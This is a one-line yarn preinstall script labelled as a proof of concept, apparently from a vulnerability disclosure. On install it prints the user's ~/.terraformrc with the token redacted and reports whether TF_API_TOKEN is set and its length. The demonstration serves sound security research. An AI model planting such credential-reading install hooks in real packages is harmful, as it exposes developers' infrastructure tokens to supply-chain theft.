scripts.preinstall: echo '[POC] yarn preinstall running' && echo '[POC] .terraformrc:' && (cat $HOME/.terraformrc 2>/dev/null | sed 's/token = .*/token = <REDACTED>/' || echo 'NOT FOUND') && echo '[POC] TF_API_TOKEN env:' && ([ -n "$TF_API_TOKEN" ] && echo "YES length=${#TF_API_TOKEN}" || echo 'not set')
